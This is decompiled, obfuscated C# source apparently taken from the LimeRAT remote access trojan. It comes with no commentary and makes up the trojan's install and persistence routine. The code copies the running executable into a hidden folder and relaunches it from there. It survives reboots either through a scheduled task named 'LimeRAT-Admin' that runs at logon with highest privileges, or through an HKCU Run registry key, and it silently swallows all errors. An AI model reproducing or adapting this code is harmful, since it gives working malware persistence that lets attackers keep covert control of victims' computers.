using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns1;
using ns2;
using ns4;
using ns5;

namespace ns10;

public class GClass9
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		if (GClass3.bool_3)
		{
			if (!Operators.ConditionalCompareObjectNotEqual((object)Application.get_ExecutablePath(), GClass3.object_0, false))
			{
				return;
			}
			try
			{
				smethod_1();
				smethod_2(Conversions.ToString(GClass3.object_0));
				smethod_3(GClass1.smethod_11());
				if (GClass3.mutex_0 != null)
				{
					GClass3.mutex_0.Close();
					GClass3.mutex_0 = null;
				}
				GClass4.smethod_1();
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall((object)null, typeof(Process), "Start", array = new object[1] { GClass3.object_0 }, (string[])null, (Type[])null, array2 = new bool[1] { true }, true);
				if (array2[0])
				{
					GClass3.object_0 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				ProjectData.EndApp();
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		GClass3.object_0 = Application.get_ExecutablePath();
	}

	private static void smethod_1()
	{
		try
		{
			if (!Directory.Exists(Interaction.Environ(GClass3.string_6) + "\\" + GClass3.string_7))
			{
				Directory.CreateDirectory(Interaction.Environ(GClass3.string_6) + "\\" + GClass3.string_7);
			}
			else if (File.Exists(Conversions.ToString(GClass3.object_0)))
			{
				File.Delete(Conversions.ToString(GClass3.object_0));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_2(string string_0)
	{
		checked
		{
			try
			{
				using (FileStream fileStream = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read))
				{
					byte[] array = new byte[(int)(fileStream.Length - 1L) + 1];
					int num = (int)fileStream.Length;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = fileStream.Read(array, num2, num);
						if (num3 == 0)
						{
							break;
						}
						num2 += num3;
						num -= num3;
					}
					num = array.Length;
					using (FileStream fileStream2 = new FileStream(string_0, FileMode.Create, FileAccess.Write))
					{
						fileStream2.Write(array, 0, num);
						fileStream2.Flush();
						fileStream2.Close();
					}
					fileStream.Flush();
					fileStream.Close();
				}
				Class0.smethod_8(Conversions.ToString(GClass3.object_0));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void smethod_3(bool bool_0)
	{
		try
		{
			if (bool_0)
			{
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr \"'", GClass3.object_0), (object)"'\"")), (AppWinStyle)0, false, -1);
			}
			else
			{
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(GClass3.string_5, RuntimeHelpers.GetObjectValue(GClass3.object_0));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
